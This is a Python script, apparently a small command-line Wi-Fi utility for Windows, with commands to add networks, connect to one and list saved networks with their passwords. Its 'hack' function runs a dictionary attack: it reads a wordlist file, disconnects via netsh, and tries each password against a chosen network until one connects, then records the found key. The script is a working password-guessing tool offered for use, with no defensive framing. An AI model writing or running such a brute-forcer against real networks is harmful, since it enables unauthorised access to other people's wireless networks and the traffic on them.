from wifi_class import Wifi
import time
import sys
import os
def add_net(cmd):
    """ add name="net_ssid" """
    r = []
    for i in range(len(cmd)):
        if cmd[i] == '"':
            r.append(i)
    print('-' * 30)
    return Wifi(cmd[r[0] + 1:r[1]], '00000000')

def connect_net(cmd,nets):
    """ connect id="net_id" """
    if len(nets) != 0:
        Wifi.disconnect()
        r=[]
        for i in range(len(cmd)):
            if cmd[i]=='"':
                r.append(i)
        id = int(cmd[r[0]+1:r[1]])
        while not (1 <= id <= len(nets)):
            id = int(input("input CORRECT net id:"))

        nets[id-1].connect()

        if Wifi.is_connected():
            print("sucsessuly connected to",nets[id-1].ssid)
            print('-' * 30)
        else:
            print("name or key is invalid")
            print('-' * 30)
    else:
        print("there is no avilable networks. add a single one.")
        print('-' * 30)


def show_nets(nets):
    """ avilable """
    if len(nets)!=0:
        print("Avilable networks")
        for i in range(len(nets)):
            if nets[i].valid==1:
                state='correct'
            else:
                state='incorrect'
            print('id=', i + 1, ' name=', nets[i].ssid, ' pass=', nets[i].key,' current pass is ',state, sep='')
        print('-' * 30)
    else:
        print("there is no avilable networks. add a single one.")
        print('-' * 30)

def hack(nets,cmd):
    """ hack id="net_id" key_list="path to file" """


    p=[]
    for i in range(len(cmd)):
        if cmd[i]=='"':
            p.append(i)
    id=int(cmd[p[0]+1:p[1]])
    f = open(cmd[p[2] + 1:p[3]])
    while not(1<=id<=len(nets)):
        print('the id is wrong')
        cmd=input()
        p = []
        for i in range(len(cmd)):
            if cmd[i] == '"':
                p.append(i)
        id = int(cmd[p[0] + 1:p[1]])
    if nets[id-1].valid==1:
        print('pass is already valid')
        print('-' * 30)
    else:
        os.system("netsh wlan disconnect  >nul 2>&1")
        key_list=[x.strip() for x in f]
        ln=len(key_list)
        nets[id-1].key='00000000'
        if key_list!=None:
            for i in range(len(key_list)):
                sys.stdout.write(f'\r {i+1}/{ln} passwords processed...')
                sys.stdout.flush()
                nets[id-1].key=key_list[i]
                print(nets[id-1].key)
                nets[id - 1].connect()
                if Wifi.is_connected():
                    sys.stdout.flush()
                    print(f'\r{key_list[i]} is pass')
                    nets[id-1].valid=1
                    print('-' * 30)
                    break
            else:
                print('pass is not in this list')
                print('-'*30)








